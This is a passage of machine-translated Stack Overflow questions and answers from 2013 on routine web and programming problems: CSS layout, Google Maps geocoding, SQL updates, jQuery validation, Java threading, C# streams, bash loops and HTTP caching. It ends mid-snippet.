现在，如果我在测试页面中用第二个代码替换第一个代码，它可以完美运行。为什么，当这个#container_toolbox 中有嵌套的 div 时，它不起作用。我正在使用 Dreamweaver 和 Aptana'a 下载来创建页面。

* * *

这是两个示例：第一个是有效的示例：

```
 <head>
        <title>ggggg</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <style type="text/css">
             html, body {
                height: 100%;
                margin: 0;
            }
           #container_toolbox   
            {
                min-height: 100%; 
                height:100%; <!-- if IE -->
                width: 100%;
                min-width:100%;
                background-color: #990000;
            }

        </style>
        <!--[if lte IE 6]>
        <style type="text/css">
            #container {
                height: 100%;
            }
        </style>
        <![endif]-->
    </head>

    <body>
        <div id="container_toolbox">
            <p> in mature regions, and changes of focus among a large 
                                pack of shops as various markets undergo change. How do you pick the right one to 
                                work with you at any point in time? -- Well, maybe you shouldn't pick one.</p> 

        </div>
    </body>

Here is the one that doesn't work I've had to eliminate html5 tags frequently:
<!doctype html>
<html class="no-js" lang="en">
<head>

  <!-- Use the .htaccess and remove these lines to avoid edge case issues.
       More info: h5bp.com/b/378 -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Toolbox</title>

<link href="../styles/toolbox_stylesheet.css" rel="stylesheet" type="text/css">
<link href="../styles/basic_style_2.css" rel="stylesheet" type="text/css">
<script type="text/javascript" >
document.createElement("header");
document.createElement("hgroup");
document.createElement("section");
document.createElement("article");
document.createElement("footer");
document.createElement("nav");
</script>
<style type="text/css">
html, body {
            height: 100%;
            margin: 0;
        }
#container_toolbox  
{
            min-height: 100%; 
            height:100%; <!-- if IE -->
            width: 100%;
            min-width:100%;

}

</style>

</head>

<body>

<div id="container_toolbox">
<!--start container for page-->
<!--top section includes: header with logo; aside with contact info...
site navigation-->
    <div id="head">
            <div id="logoDiv"><img src="../images/headerLogo.jpg" alt="Fabshops.com"></div>
            <div class="aside" id="contactAside">
                <p>Phone: (973) 738 2599</p>
                <p>Email: <a href="mailto:info@fabshops.com">info@fabshops.com</a> </p>
      </div>
            <div class="nav f" id="mainNav">
                <ul class="navul" id="ulMainNav">
                    <li><a href="../welcome.html">Home</a></li>
                    <li><a href="../ProductTypes/ProductTypes.html">Equipment Types</a></li>
                    <!--<li><a href="../About/about.html">About</a></li>-->
                    <li><a href="../contact/contact.html">Contact</a></li>
                    <li><a href="../newsletter/newsletter.html">Newsletter</a></li>
                    <li><a href="toolbox.html">Toolbox</a></li>
                </ul>
            </div>
    </div>
    <div id="accentLine">   </div>

    <!--body section includes: inner navigation; articles; aside-->
    <!--*********************************************************************-->
    <!--*********************************************************************-->
    <article id="content_toolbox">
    <!--begin content section-->
    <!--*********************************************************************-->
        <!--begin sideNav-->
        <nav class="nav" id="sideNav">
            <div class="nav" id="sideHeader">
                <h2>Tool Box</h2>
            </div>
            <div id="lowerNav">
                <ul class="sidenavul" id="sideNavList">
                    <li><a href="../welcome.html">Home</a></li>
                </ul>
            </div>
        </nav>
        <!--End sideNav-->
        <!--*********************************************************************-->
        <section class="sectionhd_toolbx" id="sectionhd_toolbx">
            <!--begin contents of section head-->
                    <h1>Select the converter appropriate for your purposes.</h1>
                    <h2>Make sure your browser permits Javascript</h2>
            <!--end contents of lead article-->
        </section>
        <!-- ******************************************************************** -->
        <!--<section id="section_toolbx">--><!--begin contents of second article--><!--end contents of second article-->
        <!--</section>--> 
    <!--end content section-->
    <section id="toolbox">
        <!-- Put the toolbox into a table as margin-left/rignt:auto is not working here -->
            <!-- Begin toolbox table -->
                <table class="tbtoolbx" id="tbtoolbox">
                    <tr>
                        <td id="tdleft">&nbsp;</td>
                        <td id="tdmiddle">

                <!--begin iframe section-->
                              <p><a href="../toolbox/Capacity_Volume.html" target="calcIframe">Volume & Capacity</a> | 
                                <a href="PressureConverter.html"                    target="calcIframe">Pressure
                                  Converter</a> | <a href="LengthConverter.html" target="calcIframe">Length
                                  Converter</a> | <a href="WeightConverter.html" target="calcIframe">Weight
                                  Converter</a> | <a href="CurrencyConverter.html" target="calcIframe">Currency
                                  Converter</a><br>
                                <a href="TemperatureConverter.html" target="calcIframe">Temperature Converter</a></p>
                              <iframe name="calcIframe" src="../toolbox/Capacity_Volume.html" scrolling="no">You
                              need a Frames Capable browser to view this content. </iframe>
                              <!--end iframe section-->                     </td>
                      <td id="tdright"></td>
                  </tr>
      </table> <!-- EndBegin toolbox table -->
    </section>
    </article>
    <!-- ************************************************************************* -->
    <!--***************************************************************************-->
<!--footer-->
<div class="footer" id="foot">
    <p><<a href="../welcome.html">Home</a> | <a href="../ProductTypes/ProductTypes.html">Equipment Types | <a href="../About/OurShops.html">Our Shops</a> | <a href="../contact/contact.html">Contact</a> | <a href="../newsletter/newsletter.html">Newsletter</a> | <a href="../toolbox/toolbox.html">Toolbox</a></p>
    <p>Fabshops.com is a subdivision of Ridgeback Company, Inc</p>
    <p>Headquarters: 61 Ormont Road, Chatham, NJ 07928</p>
    <p>Web site designed by <a>TutorWright</a></p>
</div>
<!--end container for page-->
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:43:53.203

很有可能你的内部 div 的边距溢出了容器 div，实际上，它变成了它的边距。试穿`{overflow: hidden;}`包装纸。

但是，如果没有一些 HTML 或演示，就很难确定。

# javascript - 反向地理编码：我想要地址，而不是邮政编码

> ID：15163708
> 
> 赞同：0
> 
> 时间：2013-03-01T17:41:25.677
> 
> 标签：javascript, google-maps

我使用这个[示例](https://google-developers.appspot.com/maps/documentation/javascript/examples/geocoding-reverse) 示例来创建我的代码以从 lat 中查找地址。并且很长。坐标。

问题是，同样使用正确的坐标，我找到的是邮政编码而不是地址。相反，在示例中，它可以找到地址。我也尝试使用逆向方法。我使用了我在地址中找到的坐标，但他们给了我邮政编码，而不是地址。我哪里错了？

我的代码如下：

```
<!DOCTYPE html>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script> 
<HTML>
    <HEAD>
        <script type="text/javascript" src="jquery.js"></script>
        <META NAME="GENERATOR" Content="AlterVista - Editor HTML">
        <title>LowPricePetrol</title>
        <link rel="stylesheet" type="text/css" href="homeformat.css"/>
        <script type="text/javascript"
                src="https://maps.googleapis.com/maps/api/">
        </script>
        <script type="text/javascript">
            var geocoder;
            var map;
            var lat_;
            var lng_;
            var contentString="";
            var infowindow = null;

            if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(mia_posizione);
                }else{
                    alert('La geo-localizzazione NON è possibile');
                }

            function initialize() {
                infowindow = new google.maps.InfoWindow();
                geocoder = new google.maps.Geocoder();
                var latlng = new google.maps.LatLng(40.730885,-73.997383);
                var mapOptions = {
                    zoom: 8,
                    center: latlng,
                    mapTypeId: google.maps.MapTypeId.ROADMAP
                }
                map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
            }

            function mia_posizione(position) {
                var lat_gl = position.coords.latitude;
                var lon_gl = position.coords.longitude;

                var latlng = new google.maps.LatLng(lat_gl , lon_gl );
                alert(latlng);
                geocoder.geocode({'latLng': latlng}, function(results, status) {
                    if (status == google.maps.GeocoderStatus.OK) {
                        if (results[1]) {
                        alert(results[1].formatted_address);
                            map.setZoom(11);
                            marker = new google.maps.Marker({
                            position: latlng,
                            map: map
                            });
                            infowindow.setContent(results[1].formatted_address);
                            infowindow.open(map, marker);
                        }
                    } else {
                        alert("Geocoder failed due to: " + status);
                    }
                });
            }
        </script>
    </HEAD>
    <BODY onload="initialize();">
<div class="mapbox" id="map_canvas" style="width:700px; height:350px" ></div>

</BODY>
</HTML> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:47:57.527

以下是在 JSFIDDLE 添加的 DEMO 的完整工作示例：

```
<script type="text/javascript">
    function showAddress() {
        var map,marker,infoWindow, geocoder;
        var markerPoint = new google.maps.LatLng(12.397,78.644);
        var mapOptions = {
            center: new google.maps.LatLng(12.397,73.644),
            zoom:5,
            mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        var map = new google.maps.Map(document.getElementById("map_canvas"),
            mapOptions);
        google.maps.event.addListener(map,'click',function(e) {
            getAddress(e.latLng);
        });

    function getAddress(latLng) { 

        if(!geocoder) {
            geocoder = new google.maps.Geocoder();
        }
        var geocoderRequest = {
            latLng:latLng
        }
        geocoder.geocode(geocoderRequest, function(results, status) {
            if(!infoWindow) {
                infoWindow = new google.maps.InfoWindow();
            }
            infoWindow.setPosition(latLng);
            var content = "<h2>Position :" +latLng.toUrlValue()+ "</h2>"
            if(status == google.maps.GeocoderStatus.OK) {
                for(var i =0;i <results.length; i++) {
                    if(results[0].formatted_address) { 
                        content += i + ". " +results[i].formatted_address + "<br />";

                    }
                }

            }
            else {
                content += "<p>Either you clicked on Ocean or a Politically disputed Area. Status = " + status + "</p>"
            }
            infoWindow.setContent(content);
            infoWindow.open(map)
        });
    }
    }
</script> 
```

[**示范**](http://jsfiddle.net/refhat/XW35W/2/)

单击地图将生成一个信息窗口，此信息窗口将根据反向地理编码显示所单击地点的地址。

# asp.net-mvc-3 - 将两个模型从 MVC razor 视图传递到 @html.form 提交的控制器

> ID：15163709
> 
> 赞同：2
> 
> 时间：2013-03-01T17:41:25.550
> 
> 标签：asp.net-mvc-3

我在 MVC razor 的视图中使用 @Html.BeginForm 将一个实体 UserModel 发布到控制器。

所以，在控制器中我有：

```
public ActionResult SaveUser(UserModel user)
{
} 
```

我想要的是发布另一个相关实体，即 UserPrivacyModel 到控制器，以便在控制器中我将能够接收两个对象

```
public ActionResult SaveUser(UserModel user, UserPrivacyModel userPrivacy)
{
} 
```

可以实现吗？如果是，如何？如果没有，是否有任何人可以建议的替代方法

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:49:00.963

是的，可以这样做：

```
<input type="button" name="user.Name" value="somevalue" />
...

<input type="button" name="userPrivacy.SomeProperty" value="othervalue" />
... 
```

# java - 将 FutureTask 用于异步过程的问题

> ID：15163710
> 
> 赞同：0
> 
> 时间：2013-03-01T17:41:28.723
> 
> 标签：java, asynchronous, futuretask

在我的 Java Web 应用程序中，我有一个方法可以结束大约 200 封电子邮件。由于电子邮件服务器延迟，整个过程大约需要 7 分钟。这种批量电子邮件发送必须是用户操作的结果。我当然不希望用户在被转发到下一个之前必须等待那么长时间，更不用说 Apache 无论如何都会超时，所以我正在尝试实现 FutureTask 以使进程在继续时在单独的线程中运行其余代码如下：

```
Some code;

Runnable r = (Runnable)new sendEmails(ids);
FutureTask task = new FutureTask(r, null);
Thread t = new Thread(task);
t.start();

Some more code; 
```

但是，该应用程序仍会等待 FutureTask 完成，然后再继续。我对这样的想法持开放态度，即这也不是在另一个线程中运行一些代码同时继续执行脚本的其余部分的最佳方式。有没有更好的方法/我如何使这个工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T19:19:45.567

看起来您在 for 循环中旋转了 200 多个线程。这会给机器带来很大的负担，并且由于每个线程分配的每个堆栈的大小，在 JVM 内存不足之前不会占用太多线程，最初会导致大量 GC 和 JVM 锁定，然后可能在足够高的负载下，崩溃。

遗憾的是，这可能会也可能不会解释为什么您的代码正在等待 FutureTasks 完成。它可能只是通过创建/调度这么多线程来等待由于抖动；但话又说回来，它可能不会。很可能还有其他东西可以同步您从上面的代码片段中删除的代码。

一种让您查找是否隐藏某处的棘手同步的方法是在运行代码时按 ctrl-break（假设您从命令行运行，intellij/eclipse 都有一个方便的堆栈转储图标）。这将导致系统中每个线程的堆栈转储出现。通过这样做，您将能够找到正在等待未来任务完成的用户线程，并且它会说出它正在等待哪个监视器。如果它不等待，那么你有一个不同的问题。例如，系统在短时间内创建了如此多的线程，以至于它似乎在短时间内锁定或一些这样的。

但首先我会避免过多的线程创建部分，因为这可能会掩盖问题。我建议使用类似于以下的代码：

```
ExecutorService scheduler = Executors.newCachedThreadPool() 
scheduler.submit( task ) 
```

# facebook - Facebook分享链接不显示图片

> ID：15163714
> 
> 赞同：0
> 
> 时间：2013-03-01T17:41:37.350
> 
> 标签：facebook

使用 facebook 分享链接分享我们的自定义图片时，图片突然消失。请在下面找到链接。在调试时我在其中找到了图像，但它没有显示。

感谢您对此的任何帮助！

http://www.facebook.com/sharer.php?s=100&p[title]=获得 1 张免费的城市空中蹦床公园健身通行证 - 数量有限&p[summary]=点击+这里+to+get+1+FREE+健身+传递+到+城市+空气+蹦床+公园+好+在++月++一月！+燃烧+1%2c000+卡路里+和+有+乐趣！+每个人+是+谈话+关于+它！&p[url]=http://www.urbanaircoupons.com?ref_id=1605-MB220416-2&p[images][0]=http://www.socialcampaignoffers.com/Admin/Image/Sponsors/1/FB /post_back_picture_fitness.jpg

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T18:23:18.790

我也有类似的问题

请改用此方法：http: [//developers.facebook.com/docs/reference/dialogs/feed/](http://developers.facebook.com/docs/reference/dialogs/feed/)

# sql - 在子查询中丢失我的表......有什么问题？

> ID：15163717
> 
> 赞同：2
> 
> 时间：2013-03-01T17:41:44.510
> 
> 标签：sql, sql-server-2008

我已经设置了两个表，这是设置的基本示例：

```
 Table1           Table2
 ____________     ____________
|id   |date  |   |id   |stuff |
|_____|______|   |_____|______| 
```

所以他们都有一个 id 列。我正在尝试以这种方式更新 table1：

```
update Table1
set [date] = (select [stuff] 
              from Table2 
              where Table2.id = id) 
```

但是，在该行`where Table2.id = id`中，它使用 id 字段`Table2`而不是使用 from字段`Table1`。

当我尝试`where Table2.id = Table1.id`时，我得到一个错误。如何继续跟踪 Table1 的每行 id 以在 Table2 的子查询中使用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:45:12.807

您需要将内部查询中的 id 引用到表 1。这应该可以解决您的问题：

```
update Table1
set Table1.[date] = (select Table2.[stuff] 
                     from Table2
                     where Table2.id = Table1.id) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:46:35.843

试试这个`Join`：

```
Update t1 set t1.[date] = t2.[stuff]
from Table1 t1 
      join Table2 t2 on t1.id = t2.id 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:46:36.593

这是加入版，

```
update  a
set     a.[date] = b.[stuff]
FROM    Table1  a
        INNER JOIN Table2 b
           ON a.ID = b.ID 
```

# jquery - 单选按钮未被验证

> ID：15163718
> 
> 赞同：1
> 
> 时间：2013-03-01T17:41:46.933
> 
> 标签：jquery, html, css

网址：[表格不工作](http://www.interfaithmedical.com/checksite/att.php)

我有以下脚本应该验证表单并像这里的示例一样提交：[表单工作](http://www.interfaithmedical.com/validate/form.htm)

但由于某种原因，它不适用于第一个链接。

我的 Javascript 代码保持不变：

```
$("form").submit(function () {
    var html = '';
    var submitme = true;
    $(':radio').each(function() {
        nam = $(this).attr('name');
        if (!$(':radio[name="'+nam+'"]:checked').length) {
            $(':radio[name="'+nam+'"]+label').addClass('error');
            if(html.indexOf(nam) < 0){
                html += nam +' group not checked' + '</br>';
            }
            submitme = false;
        }
        else {
            $(':radio[name="'+nam+'"]+label').removeClass('error');
        }
    });
    if(submitme == false){
        $('.errorDiv').empty().append(html).show().addClass('error');
    }
    else{
        $('.errorDiv').hide();
    }

    return submitme;
}); 
```

我要做的是验证表单并使任何未选择红色的单选按钮不提交表单。一旦用户选择了所有的表单单选，表单应该提交。

我也有这段代码，一旦选择了所有内容，就会禁用提交按钮，因此用户不能提交两次：

```
$("form").submit(function () {  
        var form = $(this);
        form.find("input[type=submit]").attr("disabled", "disabled")
        form.find("input[type=submit]").attr("value", "Processing...");
        // prevent the user from hitting ENTER on a field to submit again
        form.find("input").attr("readonly", true);
        document.body.style.cursor = "wait";
}); 
```

知道将它放在前面的 jquery 代码片段中的什么位置吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T19:15:56.620

**您必须在页面上包含该代码才能使其正常工作。**

您以 as 链接的文件`miscScripts.js`是无效的 javascript。

它开始于：

```
<!--

// function to swap inner DIVs in homepage left content
function showDiv(div_number) { 
```

并以

```
});
--> 
```

它应该是：（删除页面级别的评论标记）

```
// function to swap inner DIVs in homepage left content
function showDiv(div_number) { 
```

并以

```
}); 
```

**仅供参考，我在任何文件中都看不到“提交”代码，它在您页面上的哪个文件中？**

这些是该页面源上的链接：

```
<script src="http://code.jquery.com/jquery-1.7.1.min.js" type="text/javascript"></script>
<script type="text/javascript" src="theScriptsStyles/miscScripts.js"></script>

<script type="text/javascript" src="theScriptsStyles/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="theScriptsStyles/jquery.hoverIntent.minified.js"></script>
<script type="text/javascript" src="theScriptsStyles/jquery.naviDropDown.1.0.js"></script> 
```

EDIT2：好的，我花了一点时间查看您的代码，在某些地方似乎有点奇怪，我在您的目标中做了一些粗略的假设并重新编写了您的代码以产生这个：

注意：当用户更正表单时，我使用更改事件来关闭红色错误。您可以使用它，也可以根据需要进行修改。

```
$("form#myform").submit(function (e) {
    var myform = $(this); //done this way in case selector has multiple forms
    var invalidCount = myform.data('hasinvalidentries'); //check validation
    if (invalidCount === 0) { //0 not falsy value as 0 set errors check below
        return; // let the event bubble away
    }
    e.preventDefault(); //not check so prevent submit
    var mysubmitButton = myform.find("input[type=submit]");
    mysubmitButton.prop("disabled", true).data('buttontext', mysubmitButton.val()).val('processing...');
    document.body.style.cursor = "wait";
    var html = '';
    var submitme = true;
    $('input[type=radio]').each(function () {
        var nam = $(this).attr('name');
        var radioGroup = myform.find('input:radio[name="' + nam + '"]');
        if (!radioGroup.is(':checked')) {
            radioGroup.next('label').addClass('error');
            if (html.indexOf(nam) < 0) {
                html += nam + ' group not checked' + '<br />';
            }
            submitme = false;
        }
    });

    if (submitme) {
        $('.errorDiv').hide();
        myform.data('hasinvalidentries', 0).submit();
    } else {
        $('.errorDiv').empty().append(html).show().addClass('error');
        return submitme;
    }
});
/* Check to set the radio group as no errors when change one as one will have to be selected.
  Still possible if I manually using code set all to unselected, but acts on users changes at least.
  */
$('form#myform').on('change', 'input:radio', function () {
    var myform = $(this).parents('form'); //done this wa in case selector incudes multiple forms
    var errorCount = myform.find('.error').length;
    if (errorCount) {
        var nam = $(this).attr('name');
        myform.find(':radio[name="' + nam + '"]+label').removeClass('error');
        var mysubmitButton = myform.find("input[type=submit]");
        mysubmitButton.removeProp("disabled").val(mysubmitButton.data('buttontext'));
        errorCount = myform.find('.error').length;
        myform.data('hasinvalidentries', errorCount);
    }
}); 
```

这是该代码的一个工作示例：http: [//jsfiddle.net/whNtP/](http://jsfiddle.net/whNtP/)

# jquery - 如何使每个 切换

> ID：15163719
> 
> 赞同：1
> 
> 时间：2013-03-01T17:41:55.883
> 
> 标签：jquery, html

我怎样才能`<li>`每个`<ul>`. 这段代码发生的事情是所有`<ul>`标签都被渲染了。它还呈现所有`<li>`标签。我希望在单击`<li>`其对应项时进行切换`<ul>`。

代码：

```
<script>

   $(document).ready(function(){
      $("ul").click(function(){
         $("li").toggle();
      });
   });

</script>

<body>
   <ul>Toggle between hide() and show()</ul>
   <li>This is a paragraph.</li>
   <ul>Toggle between hide() and show()</ul>
   <li>This is a paragraph.</li>
<body/> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T17:43:06.973

将当前事件源添加为[上下文](http://api.jquery.com/jQuery/)，也`li`放入`ul`。

**[现场演示](http://jsfiddle.net/CL7dM/)**

*html*

```
<ul>Toggle between hide() and show()
    <li>This is a paragraph.</li>
</ul>
<ul>Toggle between hide() and show()
    <li>This is a paragraph.</li>
</ul> 
```

*Javascript*

```
$(document).ready(function(){
      $("ul").click(function(){
           $("li", this).toggle();
      });
}); 
```

**编辑：**当 ul 被点击而不是 li 时打开

**[现场演示](http://jsfiddle.net/CL7dM/7/)**

```
$(document).ready(function () {
    $("ul").click(function (evt) {      
        if(evt.target.tagName != 'UL') 
            return;
        $("li", this).toggle();
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:42:47.827

```
$("ul").click(function(){
      $(this).find("li").toggle();
}); 
```

并`li`在里面移动`ul`：

```
<ul>
    <li>This is a paragraph.</li>
</ul> 
```

实际上你应该完全重构你的 HTML，因为它没有任何意义（而且它是无效的）。但是 JavaScript 代码（在其他东西中触发某些东西）就像上面的代码一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:17:08.630

如果只有一个`li`，则不需要`ul`. 该`.toggle()`函数在 jQuery 1.8 中已弃用。

试试这个：

```
$(".trigger").click(function(){
   var obj = $(this).next();
   if($(obj).hasClass("hidden")){
      $(obj).removeClass("hidden").slideDown();
   } else {
      $(obj).addClass("hidden").slideUp();
   }
}); 
```

HTML：

```
<div class="trigger">Toogle</div>
<div class="elem hidden">Content</div>
<div class="trigger">Toogle</div>
<div class="elem hidden">Content</div> 
```

CSS：

```
.elem { display:none; } 
```

在此处查看演示：**[演示](http://jsfiddle.net/eSFBu/3/)**

# c# - 内存流到字符串 []

> ID：15163722
> 
> 赞同：7
> 
> 时间：2013-03-01T17:42:03.927
> 
> 标签：c#

我从内存中的 zip 文件中读取 CSV 文件的内容（要求不写入磁盘）到 MemoryStream 中。并使用以下代码获取人类可读的字符串

```
 string  result = Encoding.ASCII.GetString(memoryStream.ToArray()); 
```

但是，我们希望结果是一个 string[] 来映射 CSV 文件中的每一行。

有没有办法自动处理这个？

谢谢

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-01T17:44:50.383

首先，不需要调用`ToArray`内存流。只需使用`StreamReader`, 并`ReadLine()`重复调用：

```
memoryStream.Position = 0; // Rewind!
List<string> rows = new List<string>();
// Are you *sure* you want ASCII?
using (var reader = new StreamReader(memoryStream, Encoding.ASCII))
{
    string line;
    while ((line = reader.ReadLine()) != null)
    {
        rows.Add(line);
    }
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-01T17:44:14.157

您可以使用[`Split`](http://msdn.microsoft.com/en-us/library/system.string.split%28v=vs.71%29.aspx)方法通过换行符拆分字符串：

```
string[] result = Encoding.
                  ASCII.
                  GetString(memoryStream.ToArray()).
                  Split(new string[] { Environment.NewLine }, StringSplitOptions.None); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-01T18:39:46.953

根据您的 CSV 文件的内容，这可能比您认为的要困难得多。

假设这是你的 csv：

> id, data1, data2
> 1, some data, more data
> 2, “这个元素
> 在字段中间有一个新行”，如果你逐行阅读，这可能会产生问题

如果你只是用 reader.ReadLine() 逐行阅读，如果你碰巧在中间有新行的引用字段（这在 CSV 中通常是允许的），你将不会得到你想要的。你需要更多这样的东西

```
List<String> results = new List<string>();
StringBuilder nextRow = new StringBuilder();
bool inQuote = false;
char nextChar;
while(reader.ReadChar(out nextChar)){ // pretend ReadChar reads a char into nextChar and returns false when it hits EOF
  if(nextChar == '"'){
    inQuote = !inQuote;
  } else if(!inQuote && nextChar == '\n'){
    results.Add(nextRow.ToString());
    nextRow.Length = 0;
  } else{ nextString.Append(nextChar); }
} 
```

请注意，这处理双引号。缺少引号将是一个问题，但它们始终位于 .csv 文件中。

# bash - Unix cat 和 tail 用于 java 程序的输出

> ID：15163727
> 
> 赞同：1
> 
> 时间：2013-03-01T17:42:19.730
> 
> 标签：bash, tail, cat

我有一个需要时间执行的 java 程序，我必须运行 10 次，我只对输出的最后 5 行感兴趣，实际输出运行数百行。因为我想平均我想要`tail -5`运行到文件中的输出。我的参数`(--random)`中的一个参数也在每次运行中不断变化。

我正在执行以下操作：

```
for i in {1..10} ; do cat output| tail -5 | java -cp src.Tagger.java --random $1; done 
```

对不起，我真的不擅长 bash。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:08:56.363

你应该确保你可以首先执行你的java程序。您不能直接执行 .java 文件，必须对其进行编译。

如果你有这个文件`src/Tagger.java`，你可以尝试编译它

```
javac -cp src src/Tagger.java 
```

但如果它需要其他库或构建系统，它可能会完全不同。如果您下载了此应用程序，请参阅项目文档。

这应该默默地产生一个`src/Tagger.class`. 一旦你有了这个，你可以尝试运行它

```
java -cp src Tagger --random 1234 
```

尽管如此，如果它依赖于库，它会有所不同。

如果可行，您终于可以开始尝试循环运行它：

```
for i in {1..10}
do 
    cat output| tail -5 | java -cp src Tagger --random 1234
done 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T18:09:57.260

您希望您的 java 程序的输出首先输出，然后您需要对文件进行尾部处理。看起来您当前正在将输出作为输入提供给您的 java 程序。我不认为那是你想要的。试试这个：

```
for i in {1..10}
do 
    java -cp src.Tagger.java --random $1 > output;
    tail -5 output;
done 
```

我也怀疑您的 java 命令是否正确。运行 java 文件时，不应指定 .java 作为文件名。它需要从已编译的 .class 文件中运行，并且 java 命令假定为 .class，因此在命令行中不需要它。您也在使用 -cp （类路径），但似乎没有给它一个参数。我希望 java 命令更像：

```
java -cp classesdir com.mydomain.myapp.Tagger 
```

# objective-c - 使用 NULL 比较点和整数（'int' 和 'void *'）

> ID：15163728
> 
> 赞同：1
> 
> 时间：2013-03-01T17:42:20.260
> 
> 标签：objective-c, xcode, cocoa

在运行应用程序之前，我收到错误消息“使用 NULL 比较点和整数（'int' 和 'void *'）”。奇怪的是应用程序每次都运行完美。这是代码片段。

```
- (IBAction) addButtonAction:(id)sender
{
    int timeStamp = nil;

    timeStamp = self.hourTextField.intValue;

    if (timeStamp == NULL) {
        NSLog(@"Nothing here for ya");
    }
    else {
        NSLog(@"monkey shit");
    }

} 
```

我在线上得到错误。

```
 if (timeStamp == NULL) { 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T17:45:29.623

NULL 仅用于指针比较。`timeStamp`是一个 int，而不是一个指针，所以比较没有意义。编译器看到与 NULL 的比较并说：“也许他认为 timeStamp 是一个指针，但事实并非如此，所以我最好警告他”。在这种情况下，您可能要检查`timeStamp`不*为零*：

```
if (timeStamp == 0) {
    NSLog(@"Nothing here for ya");
} 
```

实际上，这实际上就是您的代码现在正在做的事情，因为实际上`NULL` *是*0。

另外值得注意的是编译器发出的是警告，而不是错误。重要的区别是警告是编译器认为可能是错误的东西，但不会阻止程序编译。错误实际上会阻止编译器完成其工作，并导致编译失败。你*永远不*应该忽视警告。您可以告诉编译器[将警告视为错误](http://iosdevelopertips.com/xcode/treat-warnings-as-errors.html)，以对自己进行纪律处分。

# jquery - 如何在 IE 上使用 JQuery/JSON 获得 If-modified-since？

> ID：15163730
> 
> 赞同：0
> 
> 时间：2013-03-01T17:42:20.860
> 
> 标签：jquery, json, internet-explorer, caching, if-modified-since

我正在使用一个特别昂贵的（就查询和带宽而言），将其视为项目目录。但是，目录还需要始终完全准确，即目录的更新需要实时反映，因此固定的缓存到期期限将不起作用。

客户当前正在使用 JQuery 1.8.2 请求目录，就像这样：

```
 $.ajax({
        type: "POST",
        contentType: "application/json; charset=utf-8",
        url: "http://myserver.com/somejsonquery.aspx",
        data: {},
        dataType: "json",
        success: function ( ... ) { ... },
        error: function ( ... ) { ... }
        }); 
```

结果是格式正确的 JSON，内容类型为“application/json”。

由于我在服务器端维护了一个可靠的缓存，我真的很想实现 If-Modified-Since 语义，以便我的服务器可以在缓存是当前的（不会导致数据库或网络命中）时返回 304，并且只发送如果自“If-Modified-Since”时间戳后发生重新加载，则向客户端提供新目录。

但是，我无法让它工作（至少在 IE 上）。我尝试设置以下内容，但仍然无法让客户端发送 If-Modified-Since：

*   在 JSON 请求上设置“缓存：真”
*   使服务器在响应中返回“Cache-control: private”HTTP 标头

任何对此有任何见解的人？

作为后续，我还想知道如果我将 Cache-control 设置为“public”（即可由代理服务器缓存），缓存一致性是否仍会通过代理维护？即每次客户端请求该页面时，代理都会检查回我的服务器。如果我要启用代理缓存，我需要完全确定代理将保证一致的缓存状态。

我已经坚持了一段时间，所以任何帮助将不胜感激！

谢谢，-K。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T22:59:42.713

我终于弄明白了。原来我需要进行以下更改：

客户端 jQuery：

*   在我的 AJAX 调用中使用“GET”而不是“POST”。看来 POST 不应该被缓存并且是正确的。
*   忘记在 AJAX 调用中设置“cache: true”——如果你想使用浏览器缓存，这无关紧要。仅当您想推出自己的客户端缓存系统时才重要。

服务器端：

*   始终发送 Last-Modified 标头
*   始终发送“缓存控制：私有，max-age=1”
*   检查客户端的“If-Modified-Since”标头，如果未修改，则返回 304 且无负载，否则返回 200 并返回结果集。

使用上述逻辑，我将浏览器缓存设置为 1 秒后过期，并将依赖服务器权威决定是否需要使用 304 代码返回新目录。似乎在 IE 上运行良好。

请注意 Brad 上面关于 Apple 移动浏览器行为不端的评论。由于我的用户中只有一小部分会使用 Apple 移动设备，因此我决定保留浏览器缓存，因为它的好处实在是太不可思议了，不容忽视，但尝试在特殊情况下仅对 Apple 移动浏览器强制“无缓存” .

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:51:31.363

让缓存头等跨浏览器兼容并不是一门精确的科学。如果你不介意受到网络攻击，试试这个。

1) 将唯一 id 附加到您的目录并将其发送给客户端，并在您的 ajax 请求中返回。

2) 测试该唯一 ID 是否与您的缓存目录的最新版本匹配。如果是，则返回 304 响应代码，否则返回新目录以及新的唯一 ID。

# sql-server - SQL Server 2012 命令行参数

> ID：15163734
> 
> 赞同：0
> 
> 时间：2013-03-01T17:42:31.007
> 
> 标签：sql-server, build-automation

我正在尝试通过一些命令行参数安装 SQL Server 2012。我有一个简单的表单，它有几个按钮来安装各种项目。一种是安装具有数据库名称和安全性的 SQL Server。以下是命令：

```
Private Sub btnSQLServer32_Click(sender As System.Object, e As System.EventArgs) Handles btnSQLServer32.Click

    curPath = System.IO.Path.Combine(curDirectory, "SQLEXPR.exe")
